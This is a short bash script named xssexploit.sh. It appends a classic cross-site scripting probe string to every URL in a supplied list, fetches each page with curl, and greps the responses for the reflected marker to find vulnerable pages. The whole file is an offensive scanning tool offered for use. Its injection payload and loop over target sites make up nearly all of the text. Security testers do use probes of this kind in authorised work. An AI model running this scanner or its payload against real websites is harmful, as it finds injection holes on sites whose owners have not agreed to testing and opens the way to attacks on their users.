#!/bin/bash
#
# ./xssexploit.sh [url] [filename]
# ./xssexploit.sh [http://www.google.com] [listofsites.txt]
# Make sure you don't include the / in the url.
# 
# sed 's/?..*/?/' file.txt > cleaned.txt
# sed -i 's|=.*|=|' file.txt

url=$1
x=$2
filename=${x%.*}

mkdir -p output
cp $x output
cd output
# sed -i "|^$|d" $x # attempt to remove blank lines
sed -i "s|^|$url|" $x

rm -rf ${filename}-output.txt
echo ""

while read line
do
	curl --silent -g "${line}'';!--\"<XSS>=%26{()}" > ${filename}-tmp.txt
	echo "Command: curl -g \"${line}'';!--\"<XSS>=&{()}\"" >> ${filename}-output.txt
	grep -n --color=always XSS $filename-tmp.txt | tr -d " \t" >> ${filename}-output.txt
	echo "" >> ${filename}-output.txt
done < $x 

cat ${filename}-output.txt

